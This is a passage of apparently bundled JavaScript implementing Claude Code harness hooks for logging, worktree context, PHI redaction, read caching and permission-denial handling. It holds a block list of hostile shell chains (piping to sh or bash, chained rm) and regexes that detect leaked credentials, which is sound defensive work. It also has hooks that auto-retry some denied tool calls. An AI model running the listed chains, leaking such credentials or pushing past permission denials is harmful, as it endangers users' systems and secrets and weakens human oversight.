    const entry = {
      event: "created",
      timestamp: formatTimestamp(),
      task_id: taskId,
      session_id: sessionId,
      ...input.task_subject && { task_subject: input.task_subject },
      ...input.task_description && { task_description: input.task_description },
      ...input.teammate_name && { teammate_name: input.teammate_name },
      ...input.team_name && { team_name: input.team_name }
    };
    fs6.appendFileSync(metricsFile, `${JSON.stringify(entry)}
`);
    logInfo(HOOK_NAME27, `Task creation logged for task ${taskId}`);
  } catch (error) {
    logError(HOOK_NAME27, `Failed to log task creation: ${error}`);
  }
  return outputSilentSuccess();
}
var HOOK_NAME28 = "worktree-create";
async function worktreeCreate(input) {
  const worktreePath = input.worktree_path || input.cwd || ".";
  const worktreeBranch = input.worktree_branch || "unknown";
  const mainProjectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  logDebug(HOOK_NAME28, `Worktree created: path=${worktreePath}, branch=${worktreeBranch}`);
  try {
    const contextDir = path2.join(worktreePath, CONTINUITY_DIRS.context);
    if (!fs6.existsSync(contextDir)) {
      fs6.mkdirSync(contextDir, { recursive: true });
    }
    const contextFile = path2.join(contextDir, "shared-context.json");
    if (!fs6.existsSync(contextFile)) {
      const timestamp = formatTimestamp();
      const worktreeContext = {
        version: "1.0.0",
        timestamp,
        worktree: {
          path: worktreePath,
          branch: worktreeBranch,
          main_project: mainProjectDir,
          created_at: timestamp
        },
        session_heartbeat: {
          last_activity: timestamp,
          session_start: timestamp,
          was_cleanly_ended: false
        },
        dirty_tracking: {
          files_edited_count: 0,
          files_edited_this_session: [],
          threshold_warning: 15,
          threshold_auto_suggest: 25
        }
      };
      fs6.writeFileSync(contextFile, `${JSON.stringify(worktreeContext, null, 2)}
`);
      logInfo(HOOK_NAME28, `Initialized continuity context for worktree: ${worktreeBranch}`);
    } else {
      logDebug(HOOK_NAME28, "Worktree context already exists, skipping initialization");
    }
  } catch (error) {
    logError(HOOK_NAME28, `Failed to initialize worktree context: ${error}`);
  }
  return outputSilentSuccess();
}
var HOOK_NAME29 = "worktree-remove";
var MAX_LOCK_ATTEMPTS3 = 20;
async function worktreeRemove(input) {
  const worktreePath = input.worktree_path || "unknown";
  const mainProjectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  logDebug(HOOK_NAME29, `Worktree removed: path=${worktreePath}`);
  const contextFile = path2.join(mainProjectDir, CONTINUITY_DIRS.context, "shared-context.json");
  if (!fs6.existsSync(contextFile)) {
    logDebug(HOOK_NAME29, "No main context file found, nothing to update");
    return outputSilentSuccess();
  }
  const lockDir = `${contextFile}.lock`;
  if (!await acquireLock(lockDir, MAX_LOCK_ATTEMPTS3)) {
    logError(HOOK_NAME29, "Failed to acquire lock, skipping context update");
    return outputSilentSuccess();
  }
  try {
    const raw = fs6.readFileSync(contextFile, "utf8");
    let context;
    try {
      context = JSON.parse(raw);
    } catch {
      logError(HOOK_NAME29, "Context file contains invalid JSON, skipping update");
      return outputSilentSuccess();
    }
    const timestamp = formatTimestamp();
    const archivedWorktrees = context["archived_worktrees"] || [];
    archivedWorktrees.push({
      path: worktreePath,
      removed_at: timestamp
    });
    context["archived_worktrees"] = archivedWorktrees;
    const tempFile = `${contextFile}.tmp`;
    fs6.writeFileSync(tempFile, `${JSON.stringify(context, null, 2)}
`);
    fs6.renameSync(tempFile, contextFile);
    logInfo(HOOK_NAME29, `Worktree removal recorded: ${worktreePath}`);
  } catch (error) {
    logError(HOOK_NAME29, `Failed to update context file: ${error}`);
  } finally {
    releaseLock(lockDir);
  }
  return outputSilentSuccess();
}
var HOOK_NAME30 = "stop-state-saver";
var MAX_LOCK_ATTEMPTS4 = 20;
async function stopStateSaver(input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const lastMessage = input.last_assistant_message || "";
  const source = input.source || "unknown";
  logDebug(HOOK_NAME30, `Stop event: reason=${source}, message_length=${lastMessage.length}`);
  const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
  if (!fs6.existsSync(contextFile)) {
    logDebug(HOOK_NAME30, "No context file found, nothing to update");
    return outputSilentSuccess();
  }
  const lockDir = `${contextFile}.lock`;
  if (!await acquireLock(lockDir, MAX_LOCK_ATTEMPTS4)) {
    logError(HOOK_NAME30, "Failed to acquire lock, skipping context update");
    return outputSilentSuccess();
  }
  try {
    const raw = fs6.readFileSync(contextFile, "utf8");
    let context;
    try {
      context = JSON.parse(raw);
    } catch {
      logError(HOOK_NAME30, "Context file contains invalid JSON, skipping update");
      return outputSilentSuccess();
    }
    const timestamp = formatTimestamp();
    const heartbeat = context["session_heartbeat"] || {};
    heartbeat["last_activity"] = timestamp;
    context["session_heartbeat"] = heartbeat;
    context["last_stop"] = {
      source,
      last_message: lastMessage ? truncateForLLM(lastMessage, { maxChars: 500 }) : "",
      timestamp
    };
    const tempFile = `${contextFile}.tmp`;
    fs6.writeFileSync(tempFile, `${JSON.stringify(context, null, 2)}
`);
    fs6.renameSync(tempFile, contextFile);
    logInfo(HOOK_NAME30, `Stop state captured (reason: ${source})`);
  } catch (error) {
    logError(HOOK_NAME30, `Failed to update context file: ${error}`);
  } finally {
    releaseLock(lockDir);
  }
  return outputSilentSuccess();
}
var HOOK_NAME31 = "stop-failure-handler";
var MAX_LOCK_ATTEMPTS5 = 20;
async function stopFailureHandler(input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const sessionId = input.session_id || "unknown";
  const errorType = input.source || "unknown";
  logWarn(HOOK_NAME31, `API failure: type=${errorType}, session=${sessionId}`);
  const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
  if (!fs6.existsSync(contextFile)) {
    logInfo(HOOK_NAME31, "No context file found, logging failure without context update");
    return outputSilentSuccess();
  }
  const lockDir = `${contextFile}.lock`;
  if (!await acquireLock(lockDir, MAX_LOCK_ATTEMPTS5)) {
    logError(HOOK_NAME31, "Failed to acquire lock, skipping context update");
    return outputSilentSuccess();
  }
  try {
    const raw = fs6.readFileSync(contextFile, "utf8");
    let context;
    try {
      context = JSON.parse(raw);
    } catch {
      logError(HOOK_NAME31, "Context file contains invalid JSON, skipping update");
      return outputSilentSuccess();
    }
    const timestamp = formatTimestamp();
    const heartbeat = context["session_heartbeat"] || {};
    heartbeat["last_activity"] = timestamp;
    context["session_heartbeat"] = heartbeat;
    context["last_api_error"] = {
      error_type: errorType,
      session_id: sessionId,
      timestamp
    };
    const tempFile = `${contextFile}.tmp`;
    fs6.writeFileSync(tempFile, `${JSON.stringify(context, null, 2)}
`);
    fs6.renameSync(tempFile, contextFile);
    logInfo(HOOK_NAME31, `API failure recorded (type: ${errorType})`);
  } catch (error) {
    logError(HOOK_NAME31, `Failed to update context file: ${error}`);
  } finally {
    releaseLock(lockDir);
  }
  return outputSilentSuccess();
}
var HOOK_NAME32 = "review-logger";
var MAX_LOG_SIZE = 200 * 1024;
var REVIEW_COMMAND_PATTERN = /glab\s+mr\s+(note|approve)\s+(\d+)/;
var DISCUSSION_COMMAND_PATTERN = /glab\s+api\b[\s\S]*?merge_requests\/(\d+)\/discussions/;
function getReviewLogPath() {
  return path2.join(getLogDir(), "review-history.jsonl");
}
function rotateIfNeeded(logPath) {
  try {
    const stats = fs6.statSync(logPath);
    if (stats.size > MAX_LOG_SIZE) {
      const rotatedPath = `${logPath}.1`;
      fs6.renameSync(logPath, rotatedPath);
    }
  } catch {
  }
}
function appendReviewEntry(logPath, entry) {
  const dir = path2.dirname(logPath);
  if (!fs6.existsSync(dir)) {
    fs6.mkdirSync(dir, { recursive: true });
  }
  fs6.appendFileSync(logPath, `${JSON.stringify(entry)}
`);
}
async function reviewLogger(input) {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;
  const command = getCommand(input) || "";
  const noteMatch = command.match(REVIEW_COMMAND_PATTERN);
  const discussionMatch = command.match(DISCUSSION_COMMAND_PATTERN);
  let commandType;
  let mrNumber;
  if (noteMatch?.[1] && noteMatch[2]) {
    commandType = noteMatch[1];
    mrNumber = noteMatch[2];
  } else if (discussionMatch?.[1] && command.includes("--input")) {
    commandType = "discussion";
    mrNumber = discussionMatch[1];
  } else {
    return outputSilentSuccess();
  }
  const sessionId = getSessionId(input) || "unknown";
  const entry = {
    timestamp: (/* @__PURE__ */ new Date()).toISOString(),
    mr_number: mrNumber,
    command_type: commandType,
    session_id: sessionId
  };
  try {
    const logPath = getReviewLogPath();
    rotateIfNeeded(logPath);
    appendReviewEntry(logPath, entry);
    logDebug(HOOK_NAME32, `Logged review: MR !${mrNumber} (${commandType})`);
  } catch (error) {
    logError(HOOK_NAME32, `Failed to log review: ${error}`);
  }
  return outputSilentSuccess();
}
var HOOK_NAME33 = "denial-logger";
async function denialLogger(input) {
  try {
    const projectDir = getProjectDir();
    const feedbackDir = path2.join(projectDir, ".claude", "feedback");
    fs6.mkdirSync(feedbackDir, { recursive: true });
    const entry = {
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      session_id: input.session_id || process.env["CLAUDE_SESSION_ID"] || "unknown",
      tool_name: input.tool_name || "unknown",
      command_or_path: input.tool_input?.command || input.tool_input?.file_path || "",
      agent_id: input.agent_id
    };
    const logFile = path2.join(feedbackDir, "denials.jsonl");
    fs6.appendFileSync(logFile, `${JSON.stringify(entry)}
`);
    logInfo(HOOK_NAME33, `Logged denial: ${entry.tool_name} \u2014 ${entry.command_or_path.slice(0, 80)}`);
  } catch (err) {
    logError(HOOK_NAME33, `Failed to log denial: ${err}`);
  }
  return outputSilentSuccess();
}
var HOOK_NAME34 = "denial-notification";
var DENIAL_THRESHOLD = 3;
var WINDOW_MS = 6e4;
var COOLDOWN_MS = 3e5;
var denialTimestamps = [];
var lastNotificationTime = 0;
function sendNotification(title, message) {
  try {
    const escapedTitle = title.replace(/"/g, '\\"');
    const escapedMessage = message.replace(/"/g, '\\"');
    execSync(
      `osascript -e 'display notification "${escapedMessage}" with title "${escapedTitle}"'`,
      { timeout: 3e3 }
    );
  } catch {
    logWarn(HOOK_NAME34, "Failed to send desktop notification");
  }
}
async function denialNotification(input) {
  const now = Date.now();
  denialTimestamps.push(now);
  while (denialTimestamps.length > 0 && (denialTimestamps[0] ?? 0) < now - WINDOW_MS) {
    denialTimestamps.shift();
  }
  logDebug(HOOK_NAME34, `Denials in window: ${denialTimestamps.length}/${DENIAL_THRESHOLD}`);
  if (denialTimestamps.length < DENIAL_THRESHOLD) {
    return outputSilentSuccess();
  }
  if (now - lastNotificationTime < COOLDOWN_MS) {
    logDebug(HOOK_NAME34, "Notification cooldown active, skipping");
    return outputSilentSuccess();
  }
  const toolName = input.tool_name || "unknown";
  const detail = input.tool_input?.command?.slice(0, 50) || input.tool_input?.file_path || "";
  sendNotification(
    "Claude Code: Permission Denials",
    `${denialTimestamps.length} denials in 60s. Latest: ${toolName} ${detail}. Check /permissions.`
  );
  lastNotificationTime = now;
  logInfo(HOOK_NAME34, `Notification sent: ${denialTimestamps.length} denials in window`);
  return outputSilentSuccess();
}

// src/permissiondenied/project-write-retry.ts
var HOOK_NAME35 = "project-write-retry";
var WRITE_TOOLS = /* @__PURE__ */ new Set(["Write", "Edit", "MultiEdit"]);
async function projectWriteRetry(input) {
  if (!WRITE_TOOLS.has(input.tool_name)) {
    return outputSilentSuccess();
  }
  const filePath = getFilePath(input);
  if (!filePath) {
    logDebug(HOOK_NAME35, "No file_path in input, skipping");
    return outputSilentSuccess();
  }
  if (!isWithinProject(filePath)) {
    logDebug(HOOK_NAME35, `Outside project: ${filePath}`);
    return outputSilentSuccess();
  }
  const protectedResult = isProtectedPath(filePath);
  if (protectedResult.isProtected) {
    logDebug(HOOK_NAME35, `Protected file (${protectedResult.category}): ${filePath}`);
    return outputSilentSuccess();
  }
  logInfo(HOOK_NAME35, `Retrying in-project write: ${filePath}`);
  return outputRetry();
}

// src/permissiondenied/safe-command-retry.ts
var HOOK_NAME36 = "safe-command-retry";
var MAX_RETRIES_PER_PREFIX = 3;
var SAFE_RETRY_PREFIXES = [
  "ls ",
  "ls	",
  "pwd",
  "echo ",
  "cat ",
  "head ",
  "tail ",
  "wc ",
  "which ",
  "type ",
  "file ",
  "stat ",
  "date",
  "whoami",
  "hostname",
  "uname ",
  "node --version",
  "node -v",
  "npm --version",
  "npm list",
  "npm ls",
  "npm info",
  "npm view",
  "npx --version",
  "python --version",
  "python3 --version",
  "git status",
  "git log",
  "git diff",
  "git branch",
  "git remote",
  "git show",
  "git tag",
  "glab issue list",
  "glab mr list",
  "gh issue list",
  "gh pr list"
];
var DANGEROUS_CHAIN_PATTERNS = [
  " && rm ",
  " && git push",
  " && git checkout",
  " && git reset",
  " && sudo ",
  " | sh",
  " | bash",
  " | xargs rm"
];
var retryCounters = /* @__PURE__ */ new Map();
function isSafeToRetry(command) {
  const trimmed = command.trim();
  for (const pattern of DANGEROUS_CHAIN_PATTERNS) {
    if (trimmed.includes(pattern)) {
      return { safe: false, prefix: "" };
    }
  }
  for (const prefix of SAFE_RETRY_PREFIXES) {
    if (trimmed.startsWith(prefix) || trimmed === prefix.trim()) {
      return { safe: true, prefix };
    }
  }
  return { safe: false, prefix: "" };
}
async function safeCommandRetry(input) {
  if (input.tool_name !== "Bash") {
    return outputSilentSuccess();
  }
  const command = input.tool_input?.command;
  if (!command) {
    return outputSilentSuccess();
  }
  const { safe, prefix } = isSafeToRetry(command);
  if (!safe) {
    logDebug(HOOK_NAME36, `Not a safe command, skipping retry: ${command.slice(0, 60)}`);
    return outputSilentSuccess();
  }
  const currentCount = retryCounters.get(prefix) || 0;
  if (currentCount >= MAX_RETRIES_PER_PREFIX) {
    logWarn(
      HOOK_NAME36,
      `Rate limit reached for prefix "${prefix.trim()}" (${MAX_RETRIES_PER_PREFIX} retries)`
    );
    return outputSilentSuccess();
  }
  retryCounters.set(prefix, currentCount + 1);
  logInfo(
    HOOK_NAME36,
    `Retrying safe command (${currentCount + 1}/${MAX_RETRIES_PER_PREFIX}): ${command.slice(0, 80)}`
  );
  return outputRetry();
}

// src/permissiondenied/permissiondenied-combined.ts
var HOOK_NAME37 = "permissiondenied-combined";
function isRetryDecision(result) {
  return result.hookSpecificOutput?.retry === true;
}
async function permissionDeniedCombined(input) {
  logDebug(
    HOOK_NAME37,
    `Denial event: ${input.tool_name} \u2014 ${(input.tool_input?.command || input.tool_input?.file_path || "").slice(0, 80)}`
  );
  const retryHooks = [safeCommandRetry, projectWriteRetry];
  for (const hook of retryHooks) {
    const result = await hook(input);
    if (isRetryDecision(result)) {
      logInfo(HOOK_NAME37, `Retry granted by ${hook.name}`);
      Promise.all([denialNotification(input).catch(() => {
      }), denialLogger(input).catch(() => {
      })]);
      return result;
    }
  }
  await Promise.all([
    denialNotification(input).catch(() => {
    }),
    denialLogger(input).catch(() => {
    })
  ]);
  logDebug(HOOK_NAME37, "No retry \u2014 denial logged");
  return outputSilentSuccess();
}

// src/prompt/hipaa-context-injector.ts
var HOOK_NAME38 = "hipaa-context-injector";
var MAX_RULES_PER_PROMPT = 3;
var CONTEXT_RULES = [
  {
    id: "phi-handling",
    patterns: [
      /\bPHI\b/,
      /\bpatient data\b/i,
      /\bmedical record/i,
      /\bhealth data\b/i,
      /\bhealth information\b/i,
      /\bprotected health\b/i
    ],
    context: "HIPAA: PHI must be encrypted at rest (AES-256) and in transit (TLS 1.2+). Never log PHI fields. Use tokenization for PHI in non-production environments."
  },
  {
    id: "pii-handling",
    patterns: [
      /\bPII\b/,
      /\bSSN\b/,
      /\bdate of birth\b/i,
      /\bmember name\b/i,
      /\bsocial security\b/i,
      /\bpersonal(?:ly)? identif/i
    ],
    context: "HIPAA: PII fields (SSN, DOB, name, address) require field-level encryption. Implement minimum necessary access principle. Mask PII in logs and error messages."
  },
  {
    id: "database-queries",
    patterns: [
      /\bSQL\b/,
      /\bdatabase\b/i,
      /\bmigration\b/i,
      /\bSELECT\b/,
      /\bINSERT\b/,
      /\bUPDATE\b/,
      /\bDELETE\b/,
      /\bquery\b/i
    ],
    context: "HIPAA: Use parameterized queries to prevent SQL injection. Apply row-level security for PHI tables. Audit log all access to PHI-containing tables."
  },
  {
    id: "logging-handling",
    patterns: [
      /\blogging\b/i,
      /\berror handling\b/i,
      /\bsentry\b/i,
      /\bcloudwatch\b/i,
      /\blog level/i,
      /\bstack trace/i
    ],
    context: "HIPAA: Never log PHI/PII in application logs, error messages, or stack traces. Use structured logging with PHI field scrubbing. Set log retention policies (max 6 years)."
  },
  {
    id: "auth-access",
    patterns: [
      /\bauthenticat/i,
      /\bJWT\b/,
      /\bRBAC\b/,
      /\baccess control\b/i,
      /\bauthoriz/i,
      /\btoken\b/i,
      /\bsession\b/i
    ],
    context: "HIPAA: Implement RBAC with minimum necessary access. JWT tokens must expire (max 1hr for PHI access). Log all authentication events and access to PHI resources."
  },
  {
    id: "health-domain",
    patterns: [
      /\bassessment\b/i,
      /\bhealth score\b/i,
      /\bfall risk\b/i,
      /\bcare plan\b/i,
      /\bhealth program\b/i
    ],
    context: "Health domain: Assessment scores and care plans contain PHI. Apply HIPAA safeguards to health data. Use de-identified data for analytics and reporting."
  }
];
function extractPrompt(input) {
  const topLevel = input["prompt"];
  if (typeof topLevel === "string" && topLevel.length > 0) {
    return topLevel;
  }
  const toolInputPrompt = input.tool_input?.["prompt"];
  if (typeof toolInputPrompt === "string" && toolInputPrompt.length > 0) {
    return toolInputPrompt;
  }
  return null;
}
function findMatchingRules(prompt) {
  const matched = [];
  for (const rule of CONTEXT_RULES) {
    if (matched.length >= MAX_RULES_PER_PROMPT) {
      break;
    }
    for (const pattern of rule.patterns) {
      if (pattern.test(prompt)) {
        matched.push(rule);
        break;
      }
    }
  }
  return matched;
}
async function hipaaContextInjector(input) {
  const prompt = extractPrompt(input);
  if (!prompt) {
    logDebug(HOOK_NAME38, "No prompt text found, skipping");
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME38, `Scanning prompt (${prompt.length} chars)`);
  const matchedRules = findMatchingRules(prompt);
  if (matchedRules.length === 0) {
    logDebug(HOOK_NAME38, "No keyword matches");
    return outputSilentSuccess();
  }
  const ruleIds = matchedRules.map((r) => r.id);
  logInfo(HOOK_NAME38, `Matched ${matchedRules.length} rule(s): ${ruleIds.join(", ")}`);
  const context = matchedRules.map((r) => r.context).join("\n");
  return outputPromptContext(context);
}

// src/lib/phi-redactor.ts
var DEFAULT_PHI_PATTERNS = [
  {
    id: "ssn-dashed",
    // ###-##-#### — explicit dashes only, to avoid matching arbitrary 9-digit
    // numbers (timestamps, IDs).
    regex: /\b\d{3}-\d{2}-\d{4}\b/g,
    replacement: "[SSN-REDACTED]"
  },
  {
    id: "us-phone-parens",
    // (###) ###-#### with optional space
    regex: /\(\d{3}\)\s?\d{3}-\d{4}/g,
    replacement: "[PHONE-REDACTED]"
  },
  {
    id: "us-phone-dashed",
    // ###-###-#### — three dashed groups
    regex: /\b\d{3}-\d{3}-\d{4}\b/g,
    replacement: "[PHONE-REDACTED]"
  },
  {
    id: "credit-card-spaced",
    // #### #### #### #### (Visa/MC/Discover formatting)
    regex: /\b\d{4}[\s-]\d{4}[\s-]\d{4}[\s-]\d{4}\b/g,
    replacement: "[CC-REDACTED]"
  }
];
function redactPhi(text, patterns = DEFAULT_PHI_PATTERNS) {
  if (!text) {
    return { text, matchedPatterns: [], totalSubstitutions: 0 };
  }
  const matchedPatterns = [];
  let totalSubstitutions = 0;
  let current = text;
  for (const pattern of patterns) {
    pattern.regex.lastIndex = 0;
    const matches = current.match(pattern.regex);
    if (matches && matches.length > 0) {
      matchedPatterns.push(pattern.id);
      totalSubstitutions += matches.length;
      pattern.regex.lastIndex = 0;
      current = current.replace(pattern.regex, pattern.replacement);
    }
  }
  return { text: current, matchedPatterns, totalSubstitutions };
}

// src/messagedisplay/phi-output-redactor.ts
var HOOK_NAME39 = "phi-output-redactor";
var OPT_IN_ENV_VAR = "CONTINUITY_PHI_OUTPUT_REDACT";
function extractAssistantMessage(input) {
  const record = input;
  const candidates = [
    record["message"],
    record["text"],
    record["assistant_message"],
    input.last_assistant_message,
    input.tool_input?.["message"]
  ];
  for (const candidate of candidates) {
    if (typeof candidate === "string" && candidate.length > 0) {
      return candidate;
    }
  }
  return null;
}
async function phiOutputRedactor(input) {
  if (process.env[OPT_IN_ENV_VAR] !== "1") {
    logDebug(HOOK_NAME39, "Opt-in not set, skipping");
    return outputSilentSuccess();
  }
  const message = extractAssistantMessage(input);
  if (!message) {
    logDebug(HOOK_NAME39, "No assistant message text found, skipping");
    return outputSilentSuccess();
  }
  const result = redactPhi(message);
  if (result.totalSubstitutions === 0) {
    logDebug(HOOK_NAME39, `No PHI patterns matched in ${message.length}-char message`);
    return outputSilentSuccess();
  }
  logInfo(
    HOOK_NAME39,
    `Redacted ${result.totalSubstitutions} match(es) across ${result.matchedPatterns.length} pattern(s): ${result.matchedPatterns.join(", ")}`
  );
  return outputMessageDisplay(result.text);
}
var HOOK_NAME40 = "session-title";
function getGitBranch(cwd) {
  try {
    const branch = execSync("git rev-parse --abbrev-ref HEAD", {
      cwd: cwd || process.env["CLAUDE_PROJECT_DIR"] || process.cwd(),
      timeout: 2e3,
      encoding: "utf-8",
      stdio: ["ignore", "pipe", "ignore"]
    }).trim();
    if (!branch || branch === "HEAD") {
      return null;
    }
    return branch;
  } catch {
    return null;
  }
}
function sessionTitle(input) {
  const branch = getGitBranch(input.cwd);
  if (!branch) {
    logDebug(HOOK_NAME40, "No git branch detected, skipping session title");
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME40, `Setting session title to branch: ${branch}`);
  return outputSessionTitle(branch);
}
var MEASUREMENTS_FILE = "measurements.jsonl";
var CREDENTIAL_PATTERNS2 = [
  // KEY=long-base64-or-hex (env var leak)
  /(?:^|[\s'"`])[A-Z][A-Z0-9_]{3,}=[A-Za-z0-9+/_-]{20,}/m,
  // Bearer / Authorization
  /\b(?:Bearer|Authorization)\s+[A-Za-z0-9._~+/-]{20,}/i,
  // AWS access key (AKIA…) and secret key shapes
  /\bAKIA[0-9A-Z]{16}\b/,
  /\baws_secret_access_key\b\s*[:=]\s*\S{20,}/i,
  // Generic api/secret/token=…
  /\b(?:api[_-]?key|secret|token|password|passwd)\b\s*[:=]\s*['"]?\S{16,}/i,
  // Postgres / Mongo connection strings with embedded creds
  /(?:postgres|postgresql|mongodb)(?:\+srv)?:\/\/[^/\s:]+:[^@\s]+@/i,
  // Private key headers
  /-----BEGIN (?:RSA|EC|OPENSSH|PGP) PRIVATE KEY-----/
];
function getMeasurementsPath(sessionId) {
  return path2.join(getSessionDir(sessionId), MEASUREMENTS_FILE);
}
function extractCommandPrefix(command) {
  if (!command) return "<empty>";
  const trimmed = command.trim();
  if (!trimmed) return "<empty>";
  const tokens = trimmed.split(/\s+/);
  let i = 0;
  while (i < tokens.length) {
    const t = tokens[i];
    if (t === "sudo") {
      i += 1;
      continue;
    }
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(t ?? "")) {
      i += 1;
      continue;
    }
    break;
  }
  const binToken = tokens[i] ?? "<empty>";
  const basename6 = binToken.split("/").pop() ?? binToken;
  return basename6;
}
function containsCredential(text) {
  if (!text) return false;
  return CREDENTIAL_PATTERNS2.some((pattern) => pattern.test(text));
}
function appendMeasurement(sessionId, record) {
  if (!sessionId || sessionId === "unknown") return;
  try {
    ensureSessionDir(sessionId);
    const line = `${JSON.stringify(record)}
`;
    fs6.appendFileSync(getMeasurementsPath(sessionId), line, { mode: 384 });
  } catch {
  }
}
function recordReadEvent(sessionId, filePath, outcome, originalBytes, returnedBytes) {
  const basename6 = path2.basename(filePath || "<unknown>");
  const event = {
    schemaVersion: 1,
    timestamp: (/* @__PURE__ */ new Date()).toISOString(),
    tool: "Read",
    outcome,
    basename: basename6,
    originalBytes: Math.max(0, originalBytes | 0)
  };
  if (outcome === "cache_hit" && returnedBytes !== void 0 && originalBytes > 0) {
    event.returnedBytes = Math.max(0, returnedBytes | 0);
    const saved = Math.max(0, originalBytes - event.returnedBytes);
    event.savingsPct = Math.min(100, Math.round(saved / originalBytes * 100));
  }
  appendMeasurement(sessionId, event);
}
function recordBashEvent(sessionId, command, output, durationMs) {
  const prefix = extractCommandPrefix(command);
  const inputBytes = Buffer.byteLength(command || "", "utf8");
  const outputBytes = Buffer.byteLength(output || "", "utf8");
  const redacted = containsCredential(output);
  const event = {
    schemaVersion: 1,
    timestamp: (/* @__PURE__ */ new Date()).toISOString(),
    tool: "Bash",
    commandPrefix: prefix,
    inputBytes,
    outputBytes: redacted ? null : outputBytes,
    redacted
  };
  if (durationMs !== void 0 && durationMs >= 0) {
    event.durationMs = durationMs | 0;
  }
  appendMeasurement(sessionId, event);
}

// src/pretool/read-cache.ts
var HOOK_NAME41 = "read-cache";
async function readCacheHook(input) {
  const skipped = runGuards(input, (i) => guardTool(i, "Read"));
  if (skipped) return skipped;
  const filePath = getFilePath(input);
  const sessionId = getSessionId(input);
  if (!filePath || !sessionId || sessionId === "unknown") {
    return outputSilentSuccess();
  }
  const absPath = path2.resolve(filePath);
  if (!fs6.existsSync(absPath)) {
    return outputSilentSuccess();
  }
  let stat;
  try {
    stat = fs6.statSync(absPath);
  } catch (e) {
    logDebug(HOOK_NAME41, `stat failed for ${absPath}: ${e}`);
    return outputSilentSuccess();
  }
  if (!stat.isFile()) {
    return outputSilentSuccess();
  }
  let cached;
  try {
    cached = await readEntry(sessionId, absPath);
  } catch (e) {
    logWarn(HOOK_NAME41, `cache lookup failed: ${e}`);
    return outputSilentSuccess();
  }
  if (!cached) {
    return outputSilentSuccess();
  }
  let currentContent;
  try {
    currentContent = fs6.readFileSync(absPath, "utf8");
  } catch (e) {
    logWarn(HOOK_NAME41, `read failed for ${absPath}: ${e}`);
    return outputSilentSuccess();
  }
  const currentHash = computeContentHash(currentContent);
  if (currentHash === cached.contentHash) {
    logDebug(HOOK_NAME41, `unchanged via hash check: ${absPath}`);
    return outputSilentSuccess();
  }
  const delta = computeDelta(cached.cachedContent, currentContent);
  if (delta.kind !== "delta") {
    if (delta.kind === "too-large") {
      logInfo(
        HOOK_NAME41,
        `delta exceeds ${delta.reason} budget for ${absPath}; falling through to full read`
      );
    }
    return outputSilentSuccess();
  }
  const savedChars = Math.max(0, cached.cachedContent.length - delta.diff.length);
  logInfo(HOOK_NAME41, `injecting delta for ${absPath} (saved ~${savedChars} chars)`);
  try {
    recordReadEvent(
      sessionId,
      absPath,
      "cache_hit",
      cached.cachedContent.length,
      delta.diff.length
    );
  } catch (e) {
    logDebug(HOOK_NAME41, `measurement record failed: ${e}`);
  }
  await snapshotFileToCache(sessionId, absPath);
  const message = [
    `[delta-cache] File ${absPath} was previously read this session.`,
    "Showing unified diff against the cached version. If you need the full file, re-issue the Read explicitly or modify it; large changes auto-fall-through to a full read.",
    "",
    delta.diff
  ].join("\n");
  return {
    continue: true,
    suppressOutput: false,
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: "Delta-cache: redundant Read intercepted; unified diff supplied via additionalContext.",
      additionalContext: message
    }
  };
}
var HOOK_NAME42 = "read-cache-writer";
async function readCacheWriterHook(input) {
  try {
    const skipped = runGuards(input, (i) => guardTool(i, "Read"));
    if (skipped) return skipped;
    const filePath = getFilePath(input);
    const sessionId = getSessionId(input);
    if (!filePath || !sessionId || sessionId === "unknown") {
      return outputSilentSuccess();
    }
    const absPath = path2.resolve(filePath);
    let wasMiss = false;
    try {
      const prior = await readEntry(sessionId, absPath);
      wasMiss = !prior;
    } catch (e) {
      logDebug(HOOK_NAME42, `measurement probe failed: ${e}`);
    }
    const size = await snapshotFileToCache(sessionId, absPath);
    if (size === null) {
      logDebug(HOOK_NAME42, `snapshot skipped for ${absPath} (not a regular file or I/O error)`);
      return outputSilentSuccess();
    }
    if (wasMiss) {
      try {
        recordReadEvent(sessionId, absPath, "cache_miss", size);
      } catch (e) {
        logDebug(HOOK_NAME42, `measurement record failed: ${e}`);
      }
    }
    logDebug(HOOK_NAME42, `cached read of ${absPath} (${size} bytes)`);
    return outputSilentSuccess();
  } catch (e) {
    logWarn(HOOK_NAME42, `unexpected error: ${e}`);
    return outputSilentSuccess();
  }
}
var HOOK_NAME43 = "read-cache-invalidator";
async function readCacheInvalidatorHook(input) {
  try {
    const skipped = runGuards(input, (i) => guardTool(i, "Write", "Edit", "MultiEdit"));
    if (skipped) return skipped;
    const filePath = getFilePath(input);
    const sessionId = getSessionId(input);
    if (!filePath || !sessionId || sessionId === "unknown") {
      return outputSilentSuccess();
    }
    const absPath = path2.resolve(filePath);
    const size = await snapshotFileToCache(sessionId, absPath);
    if (size === null) {
      logDebug(HOOK_NAME43, `refresh skipped for ${absPath} (not a regular file or I/O error)`);
      return outputSilentSuccess();
    }
    logDebug(HOOK_NAME43, `refreshed cache base for ${absPath} (${size} bytes) after mutation`);
    return outputSilentSuccess();
  } catch (e) {
    logWarn(HOOK_NAME43, `unexpected error: ${e}`);
    return outputSilentSuccess();
  }
}

// src/posttool/bash-output-measurer.ts
var HOOK_NAME44 = "bash-output-measurer";
function combineOutput(input) {
  const out = input.tool_output;
  if (!out) return "";
  return [out.stdout, out.stderr, out.output].filter(Boolean).join("");
}
async function bashOutputMeasurerHook(input) {
  try {
    const skipped = runGuards(input, (i) => guardTool(i, "Bash"));
    if (skipped) return skipped;
    const sessionId = getSessionId(input);
    const command = getCommand(input);
    if (!sessionId || sessionId === "unknown" || !command) {
      return outputSilentSuccess();
    }
    const output = combineOutput(input);
    const durationMs = getDurationMs(input);
    recordBashEvent(sessionId, command, output, durationMs);
    logDebug(HOOK_NAME44, `recorded bash event (cmd=${command.length}b, out=${output.length}b)`);
    return outputSilentSuccess();
  } catch (e) {
    logDebug(HOOK_NAME44, `unexpected error: ${e}`);
